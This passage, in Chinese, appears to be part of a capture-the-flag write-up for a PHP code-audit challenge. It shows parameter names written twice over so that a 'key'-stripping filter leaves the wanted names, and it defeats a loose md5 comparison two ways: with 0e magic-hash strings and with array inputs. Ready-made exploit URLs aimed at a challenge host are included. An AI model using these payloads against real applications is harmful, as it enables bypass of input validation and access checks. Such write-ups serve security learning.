### 3. 代码审计关键漏洞点

- **关键点1**：`str_replace('key','',$str)`会把查询字符串中的`key`替换为空，因此要传递`key1/key2`，需将参数名写为`kkeyey1/kkeyey2`（替换后刚好是`key1/key2`）。

- **关键点2**：验证条件`md5($key1) == md5($key2) && $key1 !== $key2`是典型的MD5绕过场景，有两种核心绕过思路。

### 4. 构造Payload（两种方法）

#### 方法1：利用0e开头的MD5弱类型比较

PHP中，以`0e`开头且后续均为数字的字符串会被解析为科学计数法的`0`，因此两个不同的字符串只要MD5值以`0e`开头，弱比较时会判定为相等。

- 示例字符串：

    - `QNKCDZO` → MD5: `0e830400451993494058024219903391`

    - `240610708` → MD5: `0e462097431906560521254854199034`

- 构造URL：

    ```Plain Text
    
    http://171.80.2.169:18044/?kkeyey1=QNKCDZO&kkeyey2=240610708
    ```

#### 方法2：利用md5()处理数组返回NULL的特性（补充方法）

PHP的`md5()`函数仅能处理字符串类型，若传入**数组**，函数会返回`NULL`（且因`display_errors=0`不会显示警告）。两个不同的数组经过`md5()`处理后均返回`NULL`，满足`md5($key1) == md5($key2)`，同时数组本身`$key1!==$key2`，完全符合验证条件。

- 原理说明：

    - `md5(array(1)) → NULL`

    - `md5(array(2)) → NULL`

    - `NULL == NULL` 结果为`true`，且`array(1)!==array(2)` 结果也为`true`。

- 构造URL（参数后加`[]`表示传入数组）：

    ```Plain Text
    
    http://171.80.2.169:18044/?kkeyey1[]=1&kkeyey2[]=2
    ```
